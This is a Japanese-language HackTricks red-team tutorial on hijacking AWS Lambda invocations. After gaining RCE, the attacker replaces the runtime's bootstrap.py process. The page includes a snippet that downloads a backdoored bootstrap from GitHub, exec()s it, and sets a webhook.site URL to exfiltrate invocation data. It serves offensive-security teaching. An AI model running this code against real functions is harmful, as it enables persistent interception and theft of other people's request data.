# AWS - Lambdaリクエストの盗み出し

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する
- **ハッキングトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

## Lambdaフロー

<figure><img src="../../../../.gitbook/assets/image (152).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer**は、コンテナ外のプロセスで、**init**プロセスに**呼び出し**を送信します。
2. initプロセスは、いくつかの興味深いエンドポイントを公開するポート**9001**でリスンします：
   - **`/2018-06-01/runtime/invocation/next`** – 次の呼び出しイベントを取得します
   - **`/2018-06-01/runtime/invocation/{invoke-id}/response`** – 呼び出しのハンドラ応答を返します
   - **`/2018-06-01/runtime/invocation/{invoke-id}/error`** – 実行エラーを返します
3. **bootstrap.py**は、initプロセスから呼び出しを取得するループを持ち、ユーザーのコードを処理するためにそれらを呼び出します（**`/next`**）。
4. 最後に、**bootstrap.py**はinitに**応答**を送信します。

ユーザーコードはモジュールとして読み込まれるため、ユーザーコードによって実行されるコード実行は実際にはこのプロセスで行われています。

## Lambdaリクエストの盗み出し

この攻撃の目的は、ユーザーコードが脆弱なリクエストを処理する**`bootstrap.py`**プロセス内で悪意のある**`bootstrap.py`**プロセスを実行させることです。これにより、**悪意のあるbootstrap**プロセスがリクエストを処理するためにinitプロセスと**通信**を開始し、**正規**のbootstrapが**罠**にかかっている間、initプロセスにリクエストを要求しません。

これは、ユーザーコードが正規の**`bootstrap.py`**プロセスによって実行されているため、簡単に達成できます。

* **現在の呼び出しの偽の結果をinitプロセスに送信**して、initがbootstrapプロセスがさらに呼び出しを待っていると思うようにします。
* リクエストを**`/${invoke-id}/response`**に送信する必要があります。
* invoke-idは、正規の**`bootstrap.py`**プロセスのスタックから[**inspect**](https://docs.python.org/3/library/inspect.html) pythonモジュールを使用して取得するか（[こちらで提案されている](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py)）、または単に再度**`/2018-06-01/runtime/invocation/next`**にリクエストして取得できます（[こちらで提案されている](https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py)）。
* 次の呼び出しを処理する悪意のある**`boostrap.py`**を実行します。
* ステルス性を確保するために、Lambda呼び出しのパラメータを攻撃者が制御するC2に送信し、その後通常通りリクエストを処理できます。
* この攻撃では、現在のLambda呼び出しから**`bootstrap.py`**の元のコードを取得し、[**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py)から悪意のあるコードを追加して実行するだけで十分です。

### 攻撃手順

1. **RCE**の脆弱性を見つける。
2. **悪意のある** **bootstrap**を生成する（例：[https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py)）
3. **悪意のある** **bootstrap**を実行する。

これらのアクションを簡単に実行できます。
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
詳細は[https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher)を参照してください。

## 参考文献

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つけてください
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
